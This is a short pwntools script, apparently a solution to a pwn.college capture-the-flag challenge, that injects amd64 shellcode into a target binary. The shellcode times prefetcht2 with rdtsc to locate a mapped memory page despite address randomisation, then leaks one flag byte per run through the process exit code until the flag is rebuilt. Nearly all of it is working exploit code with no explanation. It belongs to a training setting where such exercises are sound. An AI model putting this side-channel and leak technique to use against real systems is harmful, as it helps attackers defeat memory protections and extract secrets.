#!/bin/python

from pwn import * 

context.arch = 'amd64'
context.log_level = 'error'

FLAGLEN = 58

sc_str = '''
	mov	r14, -1
	mov	ebx, 0
	jmp	LOOP_START
LOOP_BODY:
	mov	rax, rbx
	sal	rax, 16
	mov	QWORD PTR [rbp-0x28], rax
	rdtsc
	sal	rdx, 32
	or	rax, rdx
	mov	QWORD PTR [rbp-0x30], rax
	lfence
	nop
	mov	rax, QWORD PTR [rbp-0x28]
	prefetcht2	[rax]
	lfence
	nop
	rdtsc
	sal	rdx, 32
	or	rax, rdx
	mov	QWORD PTR [rbp-0x38], rax
	mov	rax, QWORD PTR [rbp-0x38]
	sub	rax, QWORD PTR [rbp-0x30]
	mov	r13, rax
	cmp	r13, r14
	jnb	.L9
	mov	r14, r13
	mov	r12, rbx
	sal	r12, 16
.L9:
	add	rbx, 1
LOOP_START:
	cmp	rbx, 16777215
	jbe	LOOP_BODY

	xor rdi, rdi
    mov dil, [r12 + {idx}]
    mov rax, 0x3c 
    syscall
'''

flag = bytearray(FLAGLEN)
i = len('pwn.college')
while i <= FLAGLEN:
    sc_asm = asm(sc_str.format(idx=i))

    proc = process(sys.argv[1])
    proc.send(sc_asm)
    
    rc = proc.poll(block=True)
    if rc > 33 and rc < 0x7f:
        flag[i] = rc
        print("Flag: " + str(flag))
        i += 1
